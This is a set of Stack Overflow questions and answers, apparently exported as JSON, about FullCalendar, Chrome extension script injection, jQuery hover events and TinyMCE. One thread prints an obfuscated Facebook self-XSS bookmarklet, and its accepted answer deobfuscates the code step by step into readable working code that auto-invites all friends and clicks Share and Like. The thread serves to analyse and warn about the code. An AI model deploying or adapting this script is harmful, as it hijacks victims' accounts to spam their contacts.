{
    "items": [
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>FullCalendar Documentation: <a href=\"http://arshaw.com/fullcalendar/docs/\">http://arshaw.com/fullcalendar/docs/</a></p>\n\n<p>Loading events as JSON: <a href=\"http://arshaw.com/fullcalendar/docs/event_data/events_json_feed/\">http://arshaw.com/fullcalendar/docs/event_data/events_json_feed/</a></p>\n\n<p>Render event: <a href=\"http://arshaw.com/fullcalendar/docs/event_rendering/renderEvent/\">http://arshaw.com/fullcalendar/docs/event_rendering/renderEvent/</a></p>\n\n<p>Render event example:</p>\n\n<pre><code>fc.fullCalendar('renderEvent', {\n    'id': 1,\n    'title': 'Test Event 1',\n    'start': '2009-11-05T13:15:30Z',\n    'end': '2009-11-05T13:30:00Z'\n});\n</code></pre>\n\n<p>Limit the display of available months: <a href=\"http://stackoverflow.com/questions/2927744/fullcalendar-limit-the-display-of-available-months\">Fullcalendar limit the display of available months?</a></p>\n",
                    "is_accepted": true,
                    "score": 7
                }
            ],
            "body": "<p>I started a YearView in fullcalendar (derived from the basic 'MonthView', needed to display longer events such as school holidays), and I could use a hand if anyone is already familiar with the way events get displayed on a view.</p>\n\n<ol>\n<li>Using the 'BasicEventRenderer', how do I populate the 'segmentContainer' for 'DayEventRenderer' ?</li>\n<li>And when do I initialize the default start &amp; end date for delimiting the active year ? (the starting month could be changed, and it'd be nice to be able to keep the highlight on the current month and the current day).</li>\n</ol>\n\n<p>See my github fork at <a href=\"https://github.com/Paulmicha/fullcalendar\">https://github.com/Paulmicha/fullcalendar</a></p>\n\n<p>-> example file is <a href=\"https://github.com/Paulmicha/fullcalendar/blob/master/tests/year-view-test-01.html\">https://github.com/Paulmicha/fullcalendar/blob/master/tests/year-view-test-01.html</a></p>\n\n<hr>\n\n<p><img src=\"http://i.stack.imgur.com/Dt8aM.png\" alt=\"enter image description here\"></p>\n",
            "last_activity_date": 1408980287,
            "question_id": 10949486,
            "score": 21,
            "tags": [
                "javascript",
                "jquery",
                "jquery-plugins",
                "fullcalendar"
            ],
            "title": "Year View in Fullcalendar jquery plugin"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<ol>\n<li>In your manifest file, <code>\"manifest_version\": 2</code> is specified. This automatically activates a stricter mode, in which all extension's files are not available to web pages by default.</li>\n<li>Your original code would never work, because the <code>&lt;script&gt;</code> element is immediately removed after injection (the script file does not have a chance to load).</li>\n</ol>\n\n<p>As a result of 1., the following error shows up in the console:</p>\n\n<pre><code>Failed to load resource                             chrome-extension://invalid/\n</code></pre>\n\n<p>To fix the problem, add <code>script.js</code> to the whitelist, <a href=\"http://developer.chrome.com/extensions/manifest.html#web_accessible_resources\"><code>\"web_accessible_resources\"</code></a> in your <code>manifest file</code>:</p>\n\n<pre>{\n  \"name\": \"Chrome Extension\",\n  \"version\": \"1.0\",\n  <a href=\"https://developer.chrome.com/extensions/manifest.html#manifest_version\">\"manifest_version\": 2,</a>\n  \"content_scripts\": [{\n      \"matches\": [\"http://pagetoinject/script/into/*\"],\n      \"js\": [\"contentscript.js\"]\n  }]<b>,\n  <a href=\"https://developer.chrome.com/extensions/manifest.html#web_accessible_resources\">\"web_accessible_resources\": [\"script.js\"]</a></b>\n}</pre>\n",
                    "is_accepted": true,
                    "score": 32
                },
                {
                    "body": "<p>The problem here is that you are using <code>manifest_version : 2</code>. If you make that <code>manifest-version: 1</code> you'll not have any problems. Version 2 restricts many such features to improve security. Refer <a href=\"http://code.google.com/chrome/extensions/trunk/contentSecurityPolicy.html\" rel=\"nofollow\">Google Content Security Policy</a> for more details on the restrictions imposed in manifest version 2. I could not find your specific case mentioned in the CSP but when I changed the manifest version to 1 and executed your code it is working fine. </p>\n",
                    "is_accepted": false,
                    "score": -3
                }
            ],
            "body": "<p>I'm trying to get my Chrome Extension to inject some javascript with <code>content_scripts</code>, using this previous <strong><em><a href=\"http://stackoverflow.com/questions/9263671/google-chome-application-shortcut-how-to-auto-load-javascript/9310273#9310273\">answer</a></em></strong> as a reference. </p>\n\n<h2>manifest.json</h2>\n\n<pre><code>\"name\": \"My Chrome Extension\",\n\"version\": \"1.0\",\n\"manifest_version\": 2,\n\"content_scripts\": [{\n    \"matches\": [\"http://pagetoinject/script/into/*\"],\n    \"js\": [\"contentscript.js\"]\n}]  \n</code></pre>\n\n<h2><strong>contenscript.js:</strong></h2>\n\n<pre><code>var s = document.createElement('script');\ns.src = chrome.extension.getURL(\"script.js\");\n(document.head||document.documentElement).appendChild(s);\ns.parentNode.removeChild(s);\n</code></pre>\n\n<p><em>( also tried <strong></em><a href=\"http://stackoverflow.com/questions/9515704/building-a-chrome-extension-inject-code-in-a-page-using-a-content-script\">this</a><em></strong> method with no success. )</em></p>\n\n<pre><code>var s = document.createElement('script');\ns.src = chrome.extension.getURL(\"script.js\");\ns.onload = function() {\n    this.parentNode.removeChild(this);\n};\n(document.head||document.documentElement).appendChild(s);\n</code></pre>\n\n<p>I keep getting this javascript error. Here's a <a href=\"http://i.imgur.com/SIXQp.png\">screenshot</a>.</p>\n\n<p><img src=\"http://i.stack.imgur.com/PTLMQ.png\" alt=\"enter image description here\">\n    <code>GET chrome-extension://invalid/\n       (anonymous function)</code></p>\n",
            "last_activity_date": 1401722120,
            "question_id": 10527625,
            "score": 21,
            "tags": [
                "javascript",
                "jquery",
                "google-chrome-extension"
            ],
            "title": "Google Chrome Extension - Script Injections"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>Check out <a href=\"http://api.jquery.com/hover/\" rel=\"nofollow\">jQuery hover</a> which is the same as:</p>\n\n<pre><code>$(selector).mouseenter(handlerIn).mouseleave(handlerOut);\n</code></pre>\n\n<p>UPDATE: I just realized you need to persist the events via the on() method. In that case, you can use an event map like so:</p>\n\n<pre><code>.on({\n    mouseenter: function() {\n        console.log('enter');\n    },\n    mouseleave: function() {\n        console.log('bye!');\n    }\n})\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>You could also try:</p>\n\n<pre><code>$(\".my-elements\").hover(function(eIn) {\n    // do work for mouse over\n}, \nfunction(eOut) {\n    // do work for mouse out\n});\n</code></pre>\n\n<blockquote>\n  <p>update and correction</p>\n</blockquote>\n\n<p>realized you need more dynamic lock in which case Jonathan Lonowski's or Derek Hunziker's  is perfect</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Almost all jQuery methods return objects, so you can chain them together:</p>\n\n<pre><code>$(document).on('mouseenter','.my-elements', function(){\n    mouse_is_inside = true;\n}).on('mouseleave','.my-elements', function(){\n    mouse_is_inside = false;\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<pre><code>$('.my-elements').on('mouseenter mouseleave', function(event){\n    mouse_is_inside = event.type === 'mouseenter';\n});\n</code></pre>\n\n<p>but its generally not a good idea to have a global variable incidating a event state</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You can bind to both together and check the <a href=\"http://api.jquery.com/event.type/\"><code>event.type</code></a>:</p>\n\n<pre><code>$(document).on('mouseenter mouseleave', '.my-elements', function (ev) {\n    mouse_is_inside = ev.type === 'mouseenter';\n});\n</code></pre>\n\n<p>Or, if you want to keep them separate, <a href=\"http://api.jquery.com/on/\"><code>.on</code></a> has another syntax that takes an event map:</p>\n\n<pre><code>$(document).on({\n    mouseenter: function () {\n        mouse_is_inside = true;\n    },\n\n    mouseleave: function () {\n        mouse_is_inside = false;\n    }\n}, '.my-elements');\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 52
                },
                {
                    "body": "<p>For starters, you can select for your elements instead of document.</p>\n\n<pre><code>$('.my-elements').on('mouseenter', function(){\n    mouse_is_inside = true;\n});\n</code></pre>\n\n<p>You could try a shortcut notation like this...</p>\n\n<pre><code>$('.my-elements').on('mouseenter mouseleave', function(){\n    mouse_is_inside = !mouse_is_inside;\n});\n</code></pre>\n\n<p>This will negate the value every time the mouse goes in or out, which should keep the mouse_is_inside variable set to the right value.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I have a series of elements (lets call them '.my-elements') - some load on document ready, while others are loaded later via a pagination script.</p>\n\n<p>I would like to set a variable according to whether or not the mouse is over these elements.  The code below works, but I suspect there is a better way...  Can I do this so I only have to reference the DOM once?</p>\n\n<pre><code>$(document).on('mouseenter','.my-elements', function(){\n    mouse_is_inside = true;\n});\n\n$(document).on('mouseleave','.my-elements', function(){\n    mouse_is_inside = false;\n});\n</code></pre>\n\n<p>Thanks!</p>\n",
            "last_activity_date": 1332361590,
            "question_id": 9812062,
            "score": 21,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "Combining jquery functions - on() hover/mouseenter/mouseleave"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>In the TinyMCE 3.x config you can put class selectors or deselectors to specifically enable or disable TinyMCE on textareas with certain classes, just put the <code>class=\"\"</code> attribute on your textarea.</p>\n\n<pre><code>editor_deselector : \"mceNoEditor\" // class=\"mceNoEditor\" will not have tinyMCE\neditor_selector : \"mceEditor\", // class=\"mceEditor\" will.\n</code></pre>\n\n<p><a href=\"http://www.tinymce.com/wiki.php/Configuration3x%3aeditor_deselector\">Source</a>.</p>\n\n<hr>\n\n<p>As of TinyMCE 4.0.x</p>\n\n<pre><code>selector: \"textarea\", // Select all textarea\nselector: \"textarea.editme\", // Select all textarea with the class editme\nselector : \"textarea:not(.mceNoEditor)\", // Select all textarea exluding the mceNoEditor class\n</code></pre>\n\n<p><a href=\"http://www.tinymce.com/wiki.php/Configuration%3aselector\">Source</a>.</p>\n",
                    "is_accepted": false,
                    "score": 28
                },
                {
                    "body": "<p>for the textarea assign a class=\"\" to textarea  property, this will support for u</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    tinyMCE.init({\n        //mode : \"textareas\",\n        mode : \"specific_textareas\",\n        editor_selector : \"myTextEditor\",\n        theme : \"simple\"\n    });\n&lt;/script&gt;\n\n&lt;textarea id=\"'txtdesc'\" name=\"'txtdesc'\" class=\"myTextEditor\" rows=\"6\" cols=\"96\" &gt;&lt;/textarea&gt;\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 39
                },
                {
                    "body": "<p>In TinyMCE 4.x  there is no deselector so you can use normal css to determine which textareas are selected and which are not. </p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n  tinymce.init({\n        selector: \"textarea:not(.textarea-no-styles)\",\n });\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>In TinyMCE 4.x, you can use editor_selector option , but before that make sure you must updated mode to 'specific_textareas' </p>\n\n<pre><code>    &lt;script type=\"text/javascript\"&gt;\n  tinymce.init({\n    mode : \"specific_textareas\",\n    editor_selector : \"mceEditor\",\n    });\n&lt;/script&gt;\n</code></pre>\n\n<p>Also add css class same as editor_selector value in your textarea, as per above example it should look like this:</p>\n\n<pre><code>&lt;textarea id='textarea1' class='mceEditor'&gt;first text area&lt;/textarea&gt;\n</code></pre>\n\n<p>now, editor will be added in those textarea that have a class named 'mceEditor'.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am using tinymce, I have multiple text areas on my page. Is it possible to apply for only one textarea, </p>\n\n<p>1 text area is for description\nvalidation is like below </p>\n\n<pre>\nvar text = tinyMCE.get('txtdesc').getContent();\n</pre>\n\n<p>But i have more 3 more text areas in my page so tineMCE should not apply for all these text areas</p>\n\n<p>How can i apply only for one text area</p>\n\n<pre>\n// this is my tinyMCE code \n    tinyMCE.init({\n        mode : \"textareas\",\n        theme : \"advanced\"\n    });\n\n// /tinyMCE\n</pre>\n",
            "last_activity_date": 1424687753,
            "question_id": 5192496,
            "score": 21,
            "tags": [
                "javascript",
                "tinymce",
                "textarea"
            ],
            "title": "I am using tinymce, Is it possible to apply for only one textarea"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>Malicious Code</p>\n\n<pre><code>document.getElementById('app129556453726651_kPtsfs').style.visibility = 'hidden';\ndocument.getElementById('app129556453726651_fsDszN').innerHTML = document.getElementById('app129556453726651_rcgAmd').value;\nvar s = document.getElementById('suggest');\nvar m = document.getElementById('likeme');\nvar sl = document.getElementById('slink');\nvar c = document.createEvent(\"MouseEvents\");\nc.initEvent('click', true, true);\ns.dispatchEvent(c);\nsetTimeout(function () {\n    fs.select_all()\n    SocialGraphManager.submitDialog('sgm_invite_form', '/ajax/social_graph/invite_dialog.php');\n    setTimeout(function () {\n        c.initEvent('click', true, true);\n        sl.dispatchEvent(c);\n        setTimeout(function () {\n            var inp = document.getElementsByTagName('input');\n            for (i in inp) {\n                if (inp[i].value == 'Share') {\n                    inp[i].dispatchEvent(c)\n                }\n            };\n            m.dispatchEvent(c);\n            setTimeout(function () {\n                document.getElementById('app129556453726651_SqmbQL').innerHTML = document.getElementById('app129556453726651_rhsjGW').value;\n            }, 2000)\n        }, 4000)\n    }, 3000)\n}, 5000);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>This question comes up every day now...</p>\n\n<p>It is code that invites all your friends to join a group (or something similar). Then the group starts spamming advertisements at it's members.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>It is a facebook 'virus' of sort.. it actually invites all your friends to an app named socialgraph </p>\n\n<p>reference: <a href=\"http://davezor.posterous.com/reverse-engineering-the-newest-facebook-invit\" rel=\"nofollow\">http://davezor.posterous.com/reverse-engineering-the-newest-facebook-invit</a></p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>It's unclear at first what that code does (as it is intended to be) so to answer your question, the code has to be unpacked. Just so you can follow my thinking, I'm including every step of the unobfuscation here.</p>\n\n<p>This is the current form of the script with line breaks added:</p>\n\n<pre><code>(function() {\n    a='app129556453726651_fsDszN';\n    b='app129556453726651_rcgAmd';\n    rhsjGW='app129556453726651_rhsjGW';\n    SqmbQL='app129556453726651_SqmbQL';\n    kPtsfs='app129556453726651_kPtsfs';\n\n    eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('P e=[\"\\\\p\\\\g\\\\l\\\\g\\\\I\\\\g\\\\k\\\\g\\\\h\\\\D\",\"\\\\l\\\\h\\\\D\\\\k\\\\f\",\"\\\\o\\\\f\\\\h\\\\v\\\\k\\\\f\\\\q\\\\f\\\\j\\\\h\\\\J\\\\D\\\\Q\\\\x\",\"\\\\y\\\\g\\\\x\\\\x\\\\f\\\\j\",\"\\\\g\\\\j\\\\j\\\\f\\\\z\\\\R\\\\K\\\\L\\\\S\",\"\\\\p\\\\n\\\\k\\\\A\\\\f\",\"\\\\l\\\\A\\\\o\\\\o\\\\f\\\\l\\\\h\",\"\\\\k\\\\g\\\\G\\\\f\\\\q\\\\f\",\"\\\\l\\\\k\\\\g\\\\j\\\\G\",\"\\\\L\\\\r\\\\A\\\\l\\\\f\\\\v\\\\p\\\\f\\\\j\\\\h\\\\l\",\"\\\\t\\\\z\\\\f\\\\n\\\\h\\\\f\\\\v\\\\p\\\\f\\\\j\\\\h\",\"\\\\t\\\\k\\\\g\\\\t\\\\G\",\"\\\\g\\\\j\\\\g\\\\h\\\\v\\\\p\\\\f\\\\j\\\\h\",\"\\\\x\\\\g\\\\l\\\\u\\\\n\\\\h\\\\t\\\\y\\\\v\\\\p\\\\f\\\\j\\\\h\",\"\\\\l\\\\f\\\\k\\\\f\\\\t\\\\h\\\\w\\\\n\\\\k\\\\k\",\"\\\\l\\\\o\\\\q\\\\w\\\\g\\\\j\\\\p\\\\g\\\\h\\\\f\\\\w\\\\T\\\\r\\\\z\\\\q\",\"\\\\H\\\\n\\\\U\\\\n\\\\V\\\\H\\\\l\\\\r\\\\t\\\\g\\\\n\\\\k\\\\w\\\\o\\\\z\\\\n\\\\u\\\\y\\\\H\\\\g\\\\j\\\\p\\\\g\\\\h\\\\f\\\\w\\\\x\\\\g\\\\n\\\\k\\\\r\\\\o\\\\W\\\\u\\\\y\\\\u\",\"\\\\l\\\\A\\\\I\\\\q\\\\g\\\\h\\\\X\\\\g\\\\n\\\\k\\\\r\\\\o\",\"\\\\g\\\\j\\\\u\\\\A\\\\h\",\"\\\\o\\\\f\\\\h\\\\v\\\\k\\\\f\\\\q\\\\f\\\\j\\\\h\\\\l\\\\J\\\\D\\\\K\\\\n\\\\o\\\\Y\\\\n\\\\q\\\\f\",\"\\\\Z\\\\y\\\\n\\\\z\\\\f\",\"\\\\u\\\\r\\\\u\\\\w\\\\t\\\\r\\\\j\\\\h\\\\f\\\\j\\\\h\"];d=M;d[e[2]](1a)[e[1]][e[0]]=e[3];d[e[2]](a)[e[4]]=d[e[2]](b)[e[5]];s=d[e[2]](e[6]);m=d[e[2]](e[7]);N=d[e[2]](e[8]);c=d[e[10]](e[9]);c[e[12]](e[11],E,E);s[e[13]](c);B(C(){1b[e[14]]()},O);B(C(){1c[e[17]](e[15],e[16]);B(C(){c[e[12]](e[11],E,E);N[e[13]](c);B(C(){F=M[e[19]](e[18]);1d(i 1e F){1f(F[i][e[5]]==e[1g]){F[i][e[13]](c)}};m[e[13]](c);B(C(){d[e[2]](1h)[e[4]]=d[e[2]](1i)[e[5]];},1k)},1l)},1m)},O);',62,85,'||||||||||||||variables|x65|x69|x74||x6E|x6C|x73||x61|x67|x76|x6D|x6F||x63|x70|x45|x5F|x64|x68|x72|x75|setTimeout|function|x79|true|inp|x6B|x2F|x62|x42|x54|x4D|document|sl|5000|var|x49|x48|x4C|x66|x6A|x78|x2E|x44|x4E|x53|||||||||||kPtsfs|fs|SocialGraphManager|for|in|if|20|SqmbQL|rhsjGW|21|2000|4000|3000'.split('|'),0,{}))\n})();\n</code></pre>\n\n<p>As we can see, the script itself is a function inside a self calling closure that will execute instantly when the script is processed. The script contains some cryptic variables and some code packed with <a href=\"http://dean.edwards.name/packer/\">Edward's packer</a>. When we unpack the code using an unpacker <a href=\"http://www.strictly-software.com/unpacker\">like this</a>, we get the following form (line breaks added):</p>\n\n<pre><code>(function(){\n    a='app129556453726651_fsDszN';\n    b='app129556453726651_rcgAmd';\n    rhsjGW='app129556453726651_rhsjGW';\n    SqmbQL='app129556453726651_SqmbQL';\n    kPtsfs='app129556453726651_kPtsfs';\n\n    var variables = [\n        \"\\x76\\x69\\x73\\x69\\x62\\x69\\x6C\\x69\\x74\\x79\",\n        \"\\x73\\x74\\x79\\x6C\\x65\",\n        \"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\n        \"\\x68\\x69\\x64\\x64\\x65\\x6E\",\n        \"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\",\n        \"\\x76\\x61\\x6C\\x75\\x65\",\n        \"\\x73\\x75\\x67\\x67\\x65\\x73\\x74\",\n        \"\\x6C\\x69\\x6B\\x65\\x6D\\x65\",\n        \"\\x73\\x6C\\x69\\x6E\\x6B\",\n        \"\\x4D\\x6F\\x75\\x73\\x65\\x45\\x76\\x65\\x6E\\x74\\x73\",\n        \"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x76\\x65\\x6E\\x74\",\n        \"\\x63\\x6C\\x69\\x63\\x6B\",\n        \"\\x69\\x6E\\x69\\x74\\x45\\x76\\x65\\x6E\\x74\",\n        \"\\x64\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x45\\x76\\x65\\x6E\\x74\",\n        \"\\x73\\x65\\x6C\\x65\\x63\\x74\\x5F\\x61\\x6C\\x6C\",\n        \"\\x73\\x67\\x6D\\x5F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x66\\x6F\\x72\\x6D\",\n        \"\\x2F\\x61\\x6A\\x61\\x78\\x2F\\x73\\x6F\\x63\\x69\\x61\\x6C\\x5F\\x67\\x72\\x61\\x70\\x68\\x2F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2E\\x70\\x68\\x70\",\n        \"\\x73\\x75\\x62\\x6D\\x69\\x74\\x44\\x69\\x61\\x6C\\x6F\\x67\",\n        \"\\x69\\x6E\\x70\\x75\\x74\",\n        \"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x73\\x42\\x79\\x54\\x61\\x67\\x4E\\x61\\x6D\\x65\",\n        \"\\x53\\x68\\x61\\x72\\x65\",\n        \"\\x70\\x6F\\x70\\x5F\\x63\\x6F\\x6E\\x74\\x65\\x6E\\x74\"];\n\n    d = document;\n    d[variables[2]](kPtsfs)[variables[1]][variables[0]] = variables[3];\n    d[variables[2]](a)[variables[4]] = d[variables[2]](b)[variables[5]];\n    s = d[variables[2]](variables[6]);\n    m = d[variables[2]](variables[7]);\n    sl = d[variables[2]](variables[8]);\n    c = d[variables[10]](variables[9]);\n    c[variables[12]](variables[11], true, true);\n    s[variables[13]](c);\n\n    setTimeout(function () {\n        fs[variables[14]]()\n    }, 5000);\n\n    setTimeout(function () {\n        SocialGraphManager[variables[17]](variables[15], variables[16]);\n        setTimeout(function () {\n            c[variables[12]](variables[11], true, true);\n            sl[variables[13]](c);\n            setTimeout(function () {\n                inp = document[variables[19]](variables[18]);\n                for (i in inp) {\n                    if (inp[i][variables[5]] == variables[20]) {\n                        inp[i][variables[13]](c)\n                    }\n                };\n                m[variables[13]](c);\n                setTimeout(function () {\n                    d[variables[2]](SqmbQL)[variables[4]] = d[variables[2]](rhsjGW)[variables[5]];\n                }, 2000)\n            }, 4000)\n        }, 3000)\n    }, 5000);\n})();\n</code></pre>\n\n<p>We can instantly see from that that the code is executing commands in specific intervals, first after 5 seconds, then three, then four and finally after two seconds. The beginning of the script contains some hex encoded variables that can be decoded to this:</p>\n\n<pre><code>var variables = [\n    \"visibility\",\n    \"style\",\n    \"getElementById\",\n    \"hidden\",\n    \"innerHTML\",\n    \"value\",\n    \"suggest\",\n    \"likeme\",\n    \"slink\",\n    \"MouseEvents\",\n    \"createEvent\",\n    \"click\",\n    \"initEvent\",\n    \"dispatchEvent\",\n    \"select_all\",\n    \"sgm_invite_form\",\n    \"/ajax/social_graph/invite_dialog.php\",\n    \"submitDialog\",\n    \"input\",\n    \"getElementsByTagName\",\n    \"Share\",\n    \"pop_content\"];\n</code></pre>\n\n<p>By substituting those variables into the code, we get:</p>\n\n<pre><code>(function(){\n    a='app129556453726651_fsDszN';\n    b='app129556453726651_rcgAmd';\n    rhsjGW='app129556453726651_rhsjGW';\n    SqmbQL='app129556453726651_SqmbQL';\n    kPtsfs='app129556453726651_kPtsfs';\n\n    d = document;\n    d[\"getElementById\"](kPtsfs)[\"style\"][\"visibility\"] = \"hidden\";\n    d[\"getElementById\"](a)[\"innerHTML\"] = d[\"getElementById\"](b)[\"value\"];\n    s = d[\"getElementById\"](\"suggest\");\n    m = d[\"getElementById\"](\"likeme\");\n    sl = d[\"getElementById\"](\"slink\");\n    c = d[\"createEvent\"](\"MouseEvents\");\n    c[\"initEvent\"](\"click\", true, true);\n    s[\"dispatchEvent\"](c);\n\n    setTimeout(function () {\n        fs[\"select_all\"]()\n    }, 5000);\n\n    setTimeout(function () {\n        SocialGraphManager[\"submitDialog\"](\"sgm_invite_form\", \"/ajax/social_graph/invite_dialog.php\");\n        setTimeout(function () {\n            c[\"initEvent\"](\"click\", true, true);\n            sl[\"dispatchEvent\"](c);\n            setTimeout(function () {\n                inp = document[\"getElementsByTagName\"](\"input\");\n                for (i in inp) {\n                    if (inp[i][\"value\"] == \"Share\") {\n                        inp[i][\"dispatchEvent\"](c)\n                    }\n                };\n                m[\"dispatchEvent\"](c);\n                setTimeout(function () {\n                    d[\"getElementById\"](SqmbQL)[\"innerHTML\"] = d[\"getElementById\"](rhsjGW)[\"value\"];\n                }, 2000)\n            }, 4000)\n        }, 3000)\n    }, 5000);\n})();\n</code></pre>\n\n<p>And as we know that <code>document['getElementById']</code> is the same as <code>document.getElementById</code>, we can clean up the code so it finally becomes readable. I've also done variable replacement and separated the setTimeouts for readability:</p>\n\n<pre><code>(function(){\n    document.getElementById('app129556453726651_kPtsfs').style.visibility = \"hidden\";\n    document.getElementById('app129556453726651_fsDszN').innerHTML = document.getElementById('app129556453726651_rcgAmd').value;\n    s = document.getElementById(\"suggest\");\n    m = document.getElementById(\"likeme\");\n    sl = document.getElementById(\"slink\");\n    c = document.createEvent(\"MouseEvents\");\n    c.initEvent(\"click\", true, true);\n    s.dispatchEvent(c);\n\n    setTimeout(function () {\n        fs.select_all()\n    }, 5000);\n\n    setTimeout(function () {\n        SocialGraphManager.submitDialog(\"sgm_invite_form\", \"/ajax/social_graph/invite_dialog.php\");\n    }, 5000);\n\n    setTimeout(function () {\n        c.initEvent(\"click\", true, true);\n        sl.dispatchEvent(c);\n    }, 8000);\n\n    setTimeout(function () {\n        inp = document.getElementsByTagName(\"input\");                    \n        for (i in inp) {\n            if (inp[i].value == \"Share\") {\n                inp[i].dispatchEvent(c);\n            }\n        };                    \n        m.dispatchEvent(c);                \n    }, 12000);\n\n    setTimeout(function () {\n        document.getElementById('app129556453726651_SqmbQL').innerHTML = document.getElementById('app129556453726651_rhsjGW').value;\n    }, 14000);\n})();\n</code></pre>\n\n<p>Now, without knowing much of how Facebook works, this indeed looks malicious, sharing stuff you might not want to share etc. Hope that helps, the main idea of this post was to show how you can decrypt scripts like this yourself also. :)</p>\n",
                    "is_accepted": true,
                    "score": 84
                }
            ],
            "body": "<p>Not so much a question to help my own programming, but I found this page on facebook with a cool illusion and a page that says \"to see the real illusion, copy and paste this code into your address bar\" and there is a script:</p>\n\n<p><strong>DISCLAIMER: DO NOT RUN THE FOLLOWING CODE</strong></p>\n\n<pre><code>javascript:(function(){a='app129556453726651_fsDszN';\nb='app129556453726651_rcgAmd';\nrhsjGW='app129556453726651_rhsjGW';SqmbQL='app129556453726651_SqmbQL';\nkPtsfs='app129556453726651_kPtsfs';\neval(function(p,a,c,k,e,r){e=function(c)\n{return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};\nif(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e)\n{return r[e]}];e=function(){return'\\\\w+'};c=1};\nwhile(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);\nreturn p}\n('P e=[\"\\\\p\\\\g\\\\l\\\\g\\\\I\\\\g\\\\k\\\\g\\\\h\\\\D\",\"\\\\l\\\\h\\\\D\\\\k\\\\f\",\"\\\\o\\\\f\\\\h\\\\v\\\\k\\\\f\\\\q\\\\f\\\\j\\\\h\\\\J\\\\D\\\\Q\\\\x\",\"\\\\y\\\\g\\\\x\\\\x\\\\f\\\\j\",\"\\\\g\\\\j\\\\j\\\\f\\\\z\\\\R\\\\K\\\\L\\\\S\",\"\\\\p\\\\n\\\\k\\\\A\\\\f\",\"\\\\l\\\\A\\\\o\\\\o\\\\f\\\\l\\\\h\",\"\\\\k\\\\g\\\\G\\\\f\\\\q\\\\f\",\"\\\\l\\\\k\\\\g\\\\j\\\\G\",\"\\\\L\\\\r\\\\A\\\\l\\\\f\\\\v\\\\p\\\\f\\\\j\\\\h\\\\l\",\"\\\\t\\\\z\\\\f\\\\n\\\\h\\\\f\\\\v\\\\p\\\\f\\\\j\\\\h\",\"\\\\t\\\\k\\\\g\\\\t\\\\G\",\"\\\\g\\\\j\\\\g\\\\h\\\\v\\\\p\\\\f\\\\j\\\\h\",\"\\\\x\\\\g\\\\l\\\\u\\\\n\\\\h\\\\t\\\\y\\\\v\\\\p\\\\f\\\\j\\\\h\",\"\\\\l\\\\f\\\\k\\\\f\\\\t\\\\h\\\\w\\\\n\\\\k\\\\k\",\"\\\\l\\\\o\\\\q\\\\w\\\\g\\\\j\\\\p\\\\g\\\\h\\\\f\\\\w\\\\T\\\\r\\\\z\\\\q\",\"\\\\H\\\\n\\\\U\\\\n\\\\V\\\\H\\\\l\\\\r\\\\t\\\\g\\\\n\\\\k\\\\w\\\\o\\\\z\\\\n\\\\u\\\\y\\\\H\\\\g\\\\j\\\\p\\\\g\\\\h\\\\f\\\\w\\\\x\\\\g\\\\n\\\\k\\\\r\\\\o\\\\W\\\\u\\\\y\\\\u\",\"\\\\l\\\\A\\\\I\\\\q\\\\g\\\\h\\\\X\\\\g\\\\n\\\\k\\\\r\\\\o\",\"\\\\g\\\\j\\\\u\\\\A\\\\h\",\"\\\\o\\\\f\\\\h\\\\v\\\\k\\\\f\\\\q\\\\f\\\\j\\\\h\\\\l\\\\J\\\\D\\\\K\\\\n\\\\o\\\\Y\\\\n\\\\q\\\\f\",\"\\\\Z\\\\y\\\\n\\\\z\\\\f\",\"\\\\u\\\\r\\\\u\\\\w\\\\t\\\\r\\\\j\\\\h\\\\f\\\\j\\\\h\"];\nd=M;d[e[2]](1a)[e[1]][e[0]]=e[3];d[e[2]](a)[e[4]]=d[e[2]](b)[e[5]];\ns=d[e[2]](e[6]);m=d[e[2]](e[7]);N=d[e[2]](e[8]);c=d[e[10]](e[9]);c[e[12]](e[11],E,E);\ns[e[13]](c);B(C(){1b[e[14]]()},O);B(C(){1c[e[17]](e[15],e[16]);B(C(){c[e[12]](e[11],E,E);N[e[13]](c);B(C(){F=M[e[19]](e[18]);1d(i 1e 